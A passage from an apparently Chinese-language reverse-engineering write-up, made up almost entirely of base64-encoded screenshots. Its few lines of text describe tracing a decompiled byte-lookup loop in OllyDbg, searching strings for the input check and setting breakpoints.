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
rkJggg=='/><br>这个‘<code>*v1 = byte_402FF8[(char)v1[v4]];</code>’把我看蒙了；（语言基础太菜的后果QAQ）<br>于是到od中寻找该循环所在地，查看一下相应汇编代码：<br><img src='data:img/jpg;base64,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
AABJRU5ErkJggg=='/><br>搜索字符串找到关键输入处，跟踪进去，下断点，调试<br><img src='data:img/jpg;base64,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
